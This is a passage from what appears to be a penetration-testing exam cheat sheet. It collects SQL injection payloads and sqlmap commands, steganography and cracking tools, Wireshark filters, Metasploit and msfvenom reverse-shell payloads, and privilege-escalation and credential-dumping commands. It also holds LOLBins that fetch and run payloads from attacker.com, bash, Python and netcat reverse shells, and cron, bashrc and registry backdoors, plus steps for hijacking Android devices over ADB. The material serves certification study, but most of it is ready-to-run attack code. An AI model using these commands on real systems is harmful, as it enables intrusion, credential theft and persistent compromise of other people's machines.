```bash
# POST parameter
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dbs

# Specify injection point
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" -p username --dbs
```

#### Advanced Options

```bash
# Increase level and risk
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --dbs

# Specific DBMS
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --dbs

# OS shell (if privileges allow)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell

# Batch mode (no prompts)
sqlmap -u "http://target.com/page.php?id=1" --batch --dbs

# Threads for speed
sqlmap -u "http://target.com/page.php?id=1" --threads=10 --dbs
```

#### Common Exam Scenario

```bash
# Full extraction workflow
# Step 1: Find databases
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" --dbs

# Step 2: Get tables
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" -D dvwa --tables

# Step 3: Get users table
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" -D dvwa -T users --dump
```

### Manual SQL Injection

```sql
-- Test for injection
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
') OR ('1'='1

-- Union-based injection
' UNION SELECT 1,2,3--
' UNION SELECT null,null,null--
' UNION SELECT username,password,null FROM users--

-- Error-based injection
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--

-- Time-based blind injection
'; IF (1=1) WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
```

### Blind SQL Injection

```sql
-- Boolean-based blind injection
' AND 1=1--                              -- True condition
' AND 1=2--                              -- False condition

-- Extracting data character by character
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--

-- MySQL
' AND (SELECT ASCII(SUBSTRING((SELECT database()),1,1)))>100--
' AND (SELECT LENGTH(database()))=5--

-- MSSQL
' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))>64--

-- Time-based blind (data extraction)
' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--

-- SQLMap for blind injection
sqlmap -u "URL?id=1" --technique=B --dbs     # Boolean-based
sqlmap -u "URL?id=1" --technique=T --dbs     # Time-based
sqlmap -u "URL?id=1" --technique=BT --dbs    # Both
```

### Second-Order SQL Injection

```sql
-- Inject payload in one location, triggers in another
-- Example: Register username as: admin'--
-- Later query: SELECT * FROM users WHERE username='admin'--'

-- Stored payload examples
Username: ' OR '1'='1'--
Email: test@test.com' UNION SELECT password FROM users--
```

### DBMS-Specific Payloads

```sql
-- MySQL
' UNION SELECT @@version--                   -- Version
' UNION SELECT user()--                      -- Current user
' UNION SELECT database()--                  -- Current database
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT LOAD_FILE('/etc/passwd')--    -- Read file
' INTO OUTFILE '/var/www/html/shell.php'--   -- Write file

-- MSSQL
' UNION SELECT @@version--                   -- Version
' UNION SELECT SYSTEM_USER--                 -- Current user
' UNION SELECT DB_NAME()--                   -- Current database
' UNION SELECT name FROM master..sysdatabases--
' UNION SELECT name FROM sysobjects WHERE xtype='U'--
'; EXEC xp_cmdshell 'whoami'--               -- Command execution
'; EXEC master..xp_dirtree '\\attacker\share'-- -- UNC path

-- Oracle
' UNION SELECT banner FROM v$version--       -- Version
' UNION SELECT user FROM dual--              -- Current user
' UNION SELECT table_name FROM all_tables--
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--

-- PostgreSQL
' UNION SELECT version()--                   -- Version
' UNION SELECT current_user--                -- Current user
' UNION SELECT current_database()--          -- Current database
' UNION SELECT table_name FROM information_schema.tables--
'; COPY (SELECT '') TO PROGRAM 'whoami'--    -- Command execution
```

### SQLMap Advanced Options

```bash
# Tamper scripts (bypass WAF/filters)
sqlmap -u "URL?id=1" --tamper=space2comment --dbs
sqlmap -u "URL?id=1" --tamper=between,randomcase --dbs

# Common tamper scripts
# space2comment - Replace space with /**/
# randomcase - Random uppercase/lowercase
# between - Replace > with NOT BETWEEN 0 AND
# charencode - URL encode characters
# equaltolike - Replace = with LIKE

# Force specific injection technique
sqlmap -u "URL?id=1" --technique=BEUSTQ --dbs
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline

# Second-order injection
sqlmap -u "URL?id=1" --second-url="http://target.com/result.php" --dbs

# Bypass WAF
sqlmap -u "URL?id=1" --random-agent --tamper=space2comment,between --dbs

# Read/write files
sqlmap -u "URL?id=1" --file-read="/etc/passwd"
sqlmap -u "URL?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Execute OS commands
sqlmap -u "URL?id=1" --os-shell
sqlmap -u "URL?id=1" --os-cmd="whoami"

# Enumerate privileges
sqlmap -u "URL?id=1" --privileges
sqlmap -u "URL?id=1" --roles
sqlmap -u "URL?id=1" --is-dba
```

### SQL Injection Filter Bypass

```sql
-- Space bypass
/**/                                         -- Comment as space
+                                            -- Plus sign
%20                                          -- URL encoded space
%09                                          -- Tab

-- Keyword bypass
UNION/**/SELECT
UN/**/ION/**/SEL/**/ECT
uNiOn SeLeCt                                 -- Mixed case
UNION ALL SELECT

-- Quote bypass
CHAR(97,100,109,105,110)                     -- 'admin' in MySQL
CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)  -- Oracle
0x61646d696e                                 -- Hex encoding

-- Comment variations
--                                           -- MySQL/MSSQL
#                                            -- MySQL
/* */                                        -- Multi-line
/*! MySQL-specific */
```

---

## 🖼️ Steganography

### Steghide (Linux)

```bash
# Extract hidden data
steghide extract -sf image.jpg
# Enter passphrase when prompted

# Extract with password
steghide extract -sf image.jpg -p password

# Hide data in image
steghide embed -cf cover.jpg -ef secret.txt
steghide embed -cf cover.jpg -ef secret.txt -p password

# Get info about file
steghide info image.jpg
```

### OpenStego (Windows/Linux GUI)

```
1. Open OpenStego
2. Select "Extract Data"
3. Browse to stego file (image)
4. Enter password if required
5. Choose output location
6. Click "Extract Data"

For hiding:
1. Select "Hide Data"
2. Choose message file
3. Choose cover file (image)
4. Set output filename
5. Enter password (optional)
6. Click "Hide Data"
```

### Snow (Windows) - Whitespace Steganography

```bash
# Extract hidden message
Snow.exe -C -p "password" filename.txt

# Hide message
Snow.exe -C -m "secret message" -p "password" input.txt output.txt

# Common exam usage:
Snow.exe -C -p "password" message.txt
```

### QuickStego (Windows)

```
1. Open QuickStego
2. Open image file
3. Hidden text appears automatically
4. Or enter text to hide and save
```

### Identifying Steganography

```bash
# Check file for hidden content
file image.jpg
strings image.jpg
binwalk image.jpg
exiftool image.jpg

# Compare file sizes
ls -la original.jpg stego.jpg
```

### Zsteg (PNG/BMP Analysis)

```bash
# Install
gem install zsteg

# Basic analysis
zsteg image.png

# All checks
zsteg -a image.png

# Extract specific payload
zsteg -e "b1,rgb,lsb,xy" image.png > extracted.txt

# Check for specific bit depth
zsteg -b 1 image.png                      # 1-bit
zsteg -b 2 image.png                      # 2-bit
```

### Stegsolve

```bash
# GUI tool for image analysis
# Analyze different bit planes
# Useful for:
# - LSB extraction
# - Bit plane analysis
# - Frame browsing (GIF)
# - Image combining (XOR)

# Launch
java -jar Stegsolve.jar
```

### Foremost / Binwalk (File Carving)

```bash
# Foremost - Extract embedded files
foremost -i image.jpg -o output_dir
foremost -t all -i image.jpg -o output_dir

# Binwalk - Analyze and extract
binwalk image.jpg                         # Analyze
binwalk -e image.jpg                      # Extract
binwalk --dd='.*' image.jpg               # Extract all

# Scan for specific signatures
binwalk -B image.jpg                      # Binary signatures
binwalk -E image.jpg                      # Entropy analysis
```

### Audio Steganography

```bash
# Audacity - Visual waveform/spectrogram analysis
# Open audio file
# View → Spectrogram
# Look for hidden images in spectrogram

# Sonic Visualiser
# Load audio → Add Spectrogram layer

# mp3stego (Windows)
Decode.exe -X -P password audio.mp3

# Extract hidden data from WAV
steghide extract -sf audio.wav

# DeepSound (Windows)
# GUI tool for audio steganography
```

### Advanced Stego Techniques

```bash
# Check for appended data
xxd image.jpg | tail -20
hexdump -C image.jpg | tail -20

# Look for ZIP/RAR appended to image
unzip image.jpg
unrar x image.jpg

# Check EXIF for hidden data
exiftool -v image.jpg
exiftool -b -ThumbnailImage image.jpg > thumb.jpg

# JPEG specific
jpeginfo image.jpg
jhead image.jpg

# PNG specific
pngcheck -v image.png
```

### Stego Detection Checklist

```
1. Run 'file' to verify file type
2. Run 'strings' to find readable text
3. Run 'binwalk' to find embedded files
4. Run 'exiftool' to check metadata
5. Run 'steghide info' for JPEG/BMP
6. Run 'zsteg' for PNG/BMP
7. Try common passwords: password, secret, hidden, stego
8. Check file entropy with 'ent' or binwalk -E
9. Open in hex editor to check for appended data
10. Try opening as archive (ZIP, RAR)
```

---

## 🔒 Cryptography

### Hash Calculation

```bash
# Linux commands
md5sum file.txt                            # MD5
sha1sum file.txt                           # SHA1
sha256sum file.txt                         # SHA256
sha512sum file.txt                         # SHA512

# Create hash from string
echo -n "password" | md5sum
echo -n "password" | sha256sum

# Verify hash
md5sum -c hashfile.md5
sha256sum -c hashfile.sha256
```

### HashCalc (Windows)

```
1. Open HashCalc
2. Select "File" or "Text String"
3. Browse to file or enter text
4. Select hash algorithms
5. Click "Calculate"
6. Compare with known hash
```

### VeraCrypt - Disk Encryption

```bash
# Mount encrypted volume (Linux)
veracrypt /path/to/volume /mnt/veracrypt

# Mount with password
veracrypt --text --password="mypassword" /path/to/volume /mnt/veracrypt

# Dismount
veracrypt -d /mnt/veracrypt

# List mounted volumes
veracrypt -l
```

**Windows (GUI):**
```
1. Open VeraCrypt
2. Select drive letter
3. Click "Select File" or "Select Device"
4. Browse to encrypted file
5. Click "Mount"
6. Enter password
7. Access mounted drive
```

### CryptTool (Windows)

```
Used for:
- Symmetric encryption (AES, DES, 3DES)
- Asymmetric encryption (RSA)
- Hash functions
- Digital signatures
- Cryptanalysis

Common exam tasks:
1. Decrypt 3DES encrypted text
2. Analyze encryption algorithms
3. Perform frequency analysis
```

### BCTextEncoder (Windows)

```
1. Open BCTextEncoder
2. Paste encoded text
3. Enter password
4. Click "Decode"
5. View decoded message
```

### Base64 Encoding/Decoding

```bash
# Encode
echo -n "text" | base64
base64 file.txt > encoded.txt

# Decode
echo "dGV4dA==" | base64 -d
base64 -d encoded.txt > decoded.txt
```

### Common Encryption Types

| Type | Characteristics |
|------|----------------|
| **MD5** | 32 hex characters |
| **SHA1** | 40 hex characters |
| **SHA256** | 64 hex characters |
| **SHA512** | 128 hex characters |
| **Base64** | A-Z, a-z, 0-9, +, /, = padding |
| **NTLM** | 32 hex characters (Windows) |

### OpenSSL Commands

```bash
# Symmetric Encryption
# AES encryption
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
openssl enc -aes-256-cbc -d -in file.enc -out file.txt

# DES encryption
openssl enc -des-cbc -in file.txt -out file.enc
openssl enc -des-cbc -d -in file.enc -out file.txt

# 3DES encryption
openssl enc -des3 -in file.txt -out file.enc
openssl enc -des3 -d -in file.enc -out file.txt

# With password
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -pass pass:mypassword
openssl enc -aes-256-cbc -d -in file.enc -out file.txt -pass pass:mypassword

# Hash calculation
openssl dgst -md5 file.txt
openssl dgst -sha1 file.txt
openssl dgst -sha256 file.txt
openssl dgst -sha512 file.txt

# RSA key operations
openssl genrsa -out private.key 2048
openssl rsa -in private.key -pubout -out public.key
openssl rsautl -encrypt -pubin -inkey public.key -in file.txt -out file.enc
openssl rsautl -decrypt -inkey private.key -in file.enc -out file.txt
```

### Cipher Identification

```bash
# Common cipher patterns
ROT13         - Alphabetic substitution (A→N, B→O)
Caesar        - Shifted alphabet (configurable shift)
Atbash        - Reversed alphabet (A→Z, B→Y)
Vigenere      - Keyword-based polyalphabetic
Base64        - Ends with = or ==, A-Za-z0-9+/
Base32        - Uppercase A-Z, 2-7, padding with =
Hex           - 0-9, A-F only
Binary        - 0s and 1s only
Morse         - Dots and dashes

# Online cipher tools
# https://gchq.github.io/CyberChef/
# https://www.dcode.fr/
# https://cryptii.com/

# ROT13 decode
echo "message" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
python3 -c "import codecs; print(codecs.decode('zrffntr', 'rot_13'))"

# Caesar cipher brute force
for i in {1..25}; do echo "Shift $i:"; echo "ENCRYPTED" | tr "A-Za-z" "$(echo {A..Z} | cut -d' ' -f$((i+1))-26),A-$(echo {A..Z} | cut -d' ' -f$i)"; done
```

### Hex and ASCII Conversion

```bash
# Hex to ASCII
echo "48656c6c6f" | xxd -r -p
python3 -c "print(bytes.fromhex('48656c6c6f').decode())"

# ASCII to Hex
echo -n "Hello" | xxd -p
python3 -c "print('Hello'.encode().hex())"

# Binary to ASCII
echo "01001000 01100101 01101100 01101100 01101111" | perl -lape '$_=pack"B*",join"",@F'

# Decimal to ASCII
python3 -c "print(chr(72)+chr(101)+chr(108)+chr(108)+chr(111))"
```

### GPG/PGP

```bash
# Decrypt PGP file
gpg --decrypt file.gpg
gpg -d file.gpg

# Import key
gpg --import key.asc

# List keys
gpg --list-keys
gpg --list-secret-keys

# Encrypt file
gpg -c file.txt                           # Symmetric
gpg -e -r recipient file.txt              # Asymmetric
```

### Windows Cryptography Tools

```
CrypTool
- Classic ciphers (Caesar, Vigenere, Substitution)
- Modern algorithms (AES, DES, RSA)
- Hash functions
- Frequency analysis

BCTextEncoder
- Encode/decode text with password
- Common in exam for protected messages

VeraCrypt
- Mount encrypted volumes
- Full disk encryption containers
```

### Crypto Attack Techniques

```bash
# Frequency analysis (for substitution ciphers)
# Count letter frequency and compare to English:
# E T A O I N S H R (most common)

# Known plaintext attack
# If you know part of the plaintext, you can derive the key

# Dictionary attack on encrypted files
# Use fcrackzip for ZIP files
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt encrypted.zip

# John the Ripper for various formats
zip2john encrypted.zip > hash.txt
john --wordlist=rockyou.txt hash.txt

# PDF password cracking
pdf2john.py encrypted.pdf > hash.txt
john --wordlist=rockyou.txt hash.txt

# Office documents
office2john.py document.docx > hash.txt
john --wordlist=rockyou.txt hash.txt
```

---

## 📊 Wireshark & Packet Analysis

### Common Display Filters

```bash
# IP Filtering
ip.addr == 192.168.1.10                    # Source or destination
ip.src == 192.168.1.10                     # Source only
ip.dst == 192.168.1.10                     # Destination only
ip.addr == 192.168.1.0/24                  # Subnet

# Port Filtering
tcp.port == 80                             # TCP port 80
udp.port == 53                             # UDP port 53
tcp.srcport == 443                         # Source port
tcp.dstport == 22                          # Destination port

# Protocol Filtering
http                                        # HTTP traffic
dns                                         # DNS traffic
ftp                                         # FTP traffic
ssh                                         # SSH traffic
telnet                                      # Telnet traffic
icmp                                        # ICMP traffic
arp                                         # ARP traffic
smtp                                        # SMTP (email)
pop                                         # POP3 (email)

# HTTP Specific
http.request                               # HTTP requests
http.response                              # HTTP responses
http.request.method == "GET"               # GET requests
http.request.method == "POST"              # POST requests
http.request.uri contains "login"          # URI contains login

# TCP Flags
tcp.flags.syn == 1                         # SYN packets
tcp.flags.ack == 1                         # ACK packets
tcp.flags.fin == 1                         # FIN packets
tcp.flags.reset == 1                       # RST packets

# Content Search
frame contains "password"                  # Search for string
http contains "admin"                      # Search in HTTP

# Combining Filters
ip.addr == 192.168.1.10 && tcp.port == 80
http && ip.src == 192.168.1.10
(dns) || (http)
!(arp)                                     # Exclude ARP
```

### Exam-Specific Tasks

#### Find Credentials

```bash
# HTTP POST credentials
http.request.method == "POST"
# Follow TCP Stream → Look for username/password

# FTP credentials
ftp
# Look for USER and PASS commands

# Telnet credentials
telnet
# Follow TCP Stream
```

#### Identify DDoS Attack

```bash
# Look for high volume from single IP
Statistics → Conversations → Sort by packets

# SYN flood
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Common DDoS indicators:
# - Many SYN packets, few ACK
# - Single source, many destinations
# - High packet rate
```

#### Covert TCP Analysis

```bash
# Analyze Identification field for hidden data
# Look at IP ID field in hex
# Convert hex values to ASCII

# Filter for specific communication
ip.addr == 10.10.10.9 && ip.addr == 10.10.10.13
```

#### Traffic Analysis

```bash
# Statistics → Protocol Hierarchy
# Statistics → Conversations
# Statistics → Endpoints
# Statistics → I/O Graph

# Find top talkers
Statistics → Conversations → IPv4 → Sort by Bytes

# Identify port traffic
Statistics → Conversations → TCP
```

#### Extract Files

```bash
# File → Export Objects → HTTP
# File → Export Objects → SMB
# File → Export Objects → TFTP

# For TCP streams
# Right-click packet → Follow → TCP Stream
# Save as raw data
```

### tcpdump (Linux Alternative)

```bash
# Capture traffic
tcpdump -i eth0
tcpdump -i eth0 -w capture.pcap

# Read capture file
tcpdump -r capture.pcap

# Filter by host
tcpdump -i eth0 host 192.168.1.10

# Filter by port
tcpdump -i eth0 port 80

# Filter by protocol
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp
```

### Tshark (Command Line Wireshark)

```bash
# Read pcap file
tshark -r capture.pcap

# Filter and display
tshark -r capture.pcap -Y "http"
tshark -r capture.pcap -Y "ip.addr == 192.168.1.10"

# Extract specific fields
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.resp.addr

# Extract credentials
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.arg

# Statistics
tshark -r capture.pcap -z conv,tcp              # TCP conversations
tshark -r capture.pcap -z endpoints,ip          # IP endpoints
tshark -r capture.pcap -z io,stat,1             # IO statistics

# Export objects
tshark -r capture.pcap --export-objects http,output_dir
tshark -r capture.pcap --export-objects smb,output_dir

# Count packets
tshark -r capture.pcap -Y "tcp.flags.syn == 1" | wc -l

# Follow TCP stream
tshark -r capture.pcap -z follow,tcp,ascii,0
```

### Advanced Wireshark Filters

```bash
# Find login attempts
http.request.method == "POST" && http contains "login"
http.request.method == "POST" && http contains "password"

# SMTP traffic with credentials
smtp && (smtp.req.command == "AUTH" || smtp contains "password")

# DNS exfiltration detection
dns.qry.name contains "." && frame.len > 100

# SSL/TLS analysis
ssl.handshake.type == 1                   # Client Hello
ssl.handshake.type == 2                   # Server Hello
tls.handshake.extensions_server_name      # SNI hostname

# ICMP tunneling detection
icmp && data.len > 48

# ARP spoofing detection
arp.duplicate-address-detected

# Malformed packets
tcp.analysis.flags                        # TCP issues
_ws.malformed                            # Any malformed

# Large data transfers
tcp.len > 1000

# Specific user agent
http.user_agent contains "sqlmap"
http.user_agent contains "nikto"
http.user_agent contains "nmap"

# HTTP response codes
http.response.code >= 400                 # Errors
http.response.code == 200                 # OK
http.response.code == 302                 # Redirect
http.response.code == 401                 # Unauthorized
http.response.code == 403                 # Forbidden
http.response.code == 500                 # Server error
```

### Attack Pattern Detection

```bash
# Port scan detection (many SYN, few responses)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# SQL injection in traffic
http.request.uri contains "UNION"
http.request.uri contains "SELECT"
http.request.uri contains "%27"           # Single quote encoded
http.request.uri contains "1=1"

# Directory traversal
http.request.uri contains ".."
http.request.uri contains "%2e%2e"

# XSS attempts
http.request.uri contains "<script>"
http.request.uri contains "%3Cscript%3E"

# Command injection
http contains "| ls"
http contains "; cat"
http contains "$(whoami)"

# Brute force detection
# Statistics → Conversations → Sort by packets (high count from single IP)

# C2 beaconing (regular interval connections)
# Check for consistent timing patterns to same destination
```

---

## 💻 System Hacking & Exploitation

### Metasploit Framework

#### Basic Commands

```bash
# Start Metasploit
msfdb init && msfconsole

# Search for exploits
search type:exploit name:smb
search type:auxiliary name:scanner
search cve:2017-0144

# Use module
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/smb/smb_version

# Show options
show options
show payloads
show targets

# Set options
set RHOSTS 192.168.1.10
set RHOST 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444
set payload windows/meterpreter/reverse_tcp

# Run
exploit
run
```

#### Common Modules

```bash
# SMB Scanning
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_login

# RDP Scanning
use auxiliary/scanner/rdp/rdp_scanner

# FTP
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/anonymous

# SSH
use auxiliary/scanner/ssh/ssh_login

# HTTP
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/wordpress_login_enum

# MySQL
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_version
```

#### WordPress Brute Force with Metasploit

```bash
msfconsole
use auxiliary/scanner/http/wordpress_login_enum
set RHOSTS 192.168.1.10
set RPORT 8080
set TARGETURI /CEH/
set USERNAME admin
set PASS_FILE /root/Desktop/wordlists/passwords.txt
run
```

#### Creating Payloads with msfvenom

```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php

# Handler setup
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

#### Meterpreter Commands

```bash
# System information
sysinfo
getuid
getpid

# File operations
pwd
ls
cd C:\\
download file.txt
upload shell.exe

# Privilege escalation
getsystem
getprivs

# Hash dumping
hashdump

# Network
ifconfig
netstat
route

# Process
ps
migrate <PID>
kill <PID>

# Persistence
run persistence -h

# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop
```

### Remote Access

```bash
# RDP Connection
xfreerdp /u:administrator /p:password123 /v:192.168.1.10:3389
rdesktop 192.168.1.10

# SSH
ssh user@192.168.1.10
ssh -p 2222 user@192.168.1.10

# Telnet
telnet 192.168.1.10
```

### Privilege Escalation

#### Linux Privilege Escalation

```bash
# Basic enumeration
id                                         # Current user and groups
whoami                                     # Current username
uname -a                                   # Kernel version
cat /etc/os-release                       # OS info

# SUDO privileges
sudo -l                                    # List sudo privileges
sudo -V                                    # Sudo version (check for vulns)

# SUID/SGID binaries
find / -perm -4000 2>/dev/null            # SUID binaries
find / -perm -2000 2>/dev/null            # SGID binaries
find / -perm -u=s -type f 2>/dev/null     # Alternative SUID search

# GTFOBins - https://gtfobins.github.io/
# Check if any SUID binary can be exploited

# Cron jobs
cat /etc/crontab
cat /var/spool/cron/crontabs/*
ls -la /etc/cron.*

# Writable files in sensitive locations
find / -writable -type f 2>/dev/null
ls -la /etc/passwd                        # Can we write?
ls -la /etc/shadow

# Capabilities
getcap -r / 2>/dev/null

# Kernel exploits
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# LinPEAS - Automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Common privilege escalation vectors
# - SUID/SGID binaries (GTFOBins)
# - Misconfigured sudo
# - Writable /etc/passwd
# - Kernel exploits (DirtyCow, etc.)
# - Docker group membership
# - Cron job exploitation
# - PATH hijacking
```

#### Windows Privilege Escalation

```bash
# Basic enumeration
whoami                                     # Current user
whoami /priv                              # Privileges
whoami /groups                            # Group memberships
systeminfo                                 # System info
hostname                                   # Computer name

# Users and groups
net user                                   # List users
net localgroup                            # List groups
net localgroup administrators             # Admin members
net user username                         # User details

# Running processes
tasklist /v
wmic process list brief

# Services
wmic service get name,startname,pathname
sc query state= all

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Always install elevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\

# WinPEAS - Automated enumeration
# Download and run winPEAS.exe

# Common Windows priv esc vectors
# - Unquoted service paths
# - Weak service permissions
# - AlwaysInstallElevated
# - Stored credentials
# - SeImpersonatePrivilege (Potato attacks)
# - Kernel exploits
```

### Windows Post-Exploitation

```bash
# Credential dumping (Meterpreter)
hashdump                                  # Dump SAM hashes
load kiwi                                 # Load Mimikatz extension
creds_all                                 # Dump all credentials
lsa_dump_sam                              # Dump SAM
lsa_dump_secrets                          # Dump LSA secrets

# Windows credential locations
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Then crack offline with samdump2 or secretsdump.py

# Secretsdump (Impacket)
secretsdump.py domain/user:password@192.168.1.10
secretsdump.py -sam sam.bak -system system.bak LOCAL

# Pass the Hash
pth-winexe -U administrator%hash //192.168.1.10 cmd.exe
psexec.py -hashes :ntlm_hash domain/user@192.168.1.10
wmiexec.py -hashes :ntlm_hash domain/user@192.168.1.10

# Token manipulation (Meterpreter)
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

### Living Off The Land (LOLBins)

```bash
# Windows LOLBins - https://lolbas-project.github.io/

# Download files
certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe
bitsadmin /transfer myJob /download /priority normal http://attacker.com/shell.exe C:\shell.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker.com/shell.exe','shell.exe')"
curl http://attacker.com/shell.exe -o shell.exe

# Execute payloads
mshta http://attacker.com/payload.hta
msiexec /q /i http://attacker.com/payload.msi
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe")

# Bypass execution policy
powershell -ep bypass -f script.ps1
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

# Encode commands
powershell -enc [BASE64_ENCODED_COMMAND]

# Linux LOLBins - https://gtfobins.github.io/

# Reverse shells
bash -i >& /dev/tcp/attacker/4444 0>&1
python -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
nc -e /bin/bash attacker 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f

# File transfers
wget http://attacker.com/file
curl http://attacker.com/file -o file
nc -lvnp 4444 > file (receiver) / nc attacker 4444 < file (sender)
```

### Persistence Techniques

```bash
# Windows persistence
# Registry run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled task
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon

# Startup folder
copy backdoor.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

# WMI event subscription (Meterpreter)
run persistence -h

# Linux persistence
# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" >> /etc/crontab

# SSH authorized keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Bashrc
echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> ~/.bashrc

# SUID binary
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

### Common Malware Ports

```
┌─────────────────────────────────────────────┐
│         COMMON RAT/TROJAN PORTS             │
├─────────────────────────────────────────────┤
│  Port 5552   - njRAT                        │
│  Port 5110   - ProRAT                       │
│  Port 6703   - Theef                        │
│  Port 9871   - Theef                        │
│  Port 1234   - SubSeven                     │
│  Port 4444   - Metasploit default           │
│  Port 5555   - Android Debug Bridge (ADB)   │
└─────────────────────────────────────────────┘
```

---

## 📱 Mobile Platform Hacking

### Android Hacking with ADB

```bash
# Connect to device
adb connect 192.168.1.20:5555

# List connected devices
adb devices

# Get shell
adb shell

# File operations
adb pull /sdcard/file.txt /local/path/     # Download from device
adb push /local/file.txt /sdcard/          # Upload to device

# Install APK
adb install app.apk

# Uninstall app
adb uninstall com.package.name

# List packages
adb shell pm list packages

# Get device info
adb shell getprop

# Screenshot
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png

# Screen record
adb shell screenrecord /sdcard/video.mp4
```

### PhoneSploit (Automated ADB Exploitation)

```bash
# Clone and setup
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
python3 -m pip install colorama

# Run
python3 phonesploit.py

# Menu options:
# 1. Connect device
# 2. Disconnect device
# 3. Get shell
# 4. Pull files
# 5. Push files
# 6. Install APK
# 7. Screen record
# 8. Screenshot
```

### Common Exam Scenario

```bash
# 1. Discover Android device (usually port 5555)
nmap -p 5555 192.168.1.0/24

# 2. Connect via ADB
adb connect 192.168.1.20:5555

# 3. Pull specific file (question will specify)
adb pull /sdcard/Download/secret.txt /home/user/Desktop/
adb pull /sdcard/log.txt /root/Desktop/

# 4. Or use PhoneSploit for automated extraction
```

---

## 📡 Wireless Network Hacking

### Aircrack-ng Suite

```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture specific network
